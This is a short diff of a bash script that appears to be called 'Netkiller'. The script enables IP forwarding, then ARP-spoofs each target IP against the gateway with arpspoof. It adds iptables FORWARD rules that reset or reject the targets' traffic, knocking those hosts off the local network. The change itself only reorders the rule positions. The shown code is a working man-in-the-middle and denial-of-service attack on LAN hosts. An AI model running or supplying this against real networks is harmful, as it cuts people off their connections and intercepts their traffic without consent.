@@ -23,7 +23,7 @@ fi
 # IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
 echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
-iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -I FORWARD 1 -m state --state ESTABLISHED,RELATED -j ACCEPT
 echo " "
 
 # Functions for clean up
@@ -233,8 +233,8 @@ for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
      PIDS+=($!)
-     iptables -I FORWARD 1 -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-     iptables -I FORWARD 2 -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
+     iptables -I FORWARD 2 -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+     iptables -I FORWARD 3 -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
 done
 
 echo " "
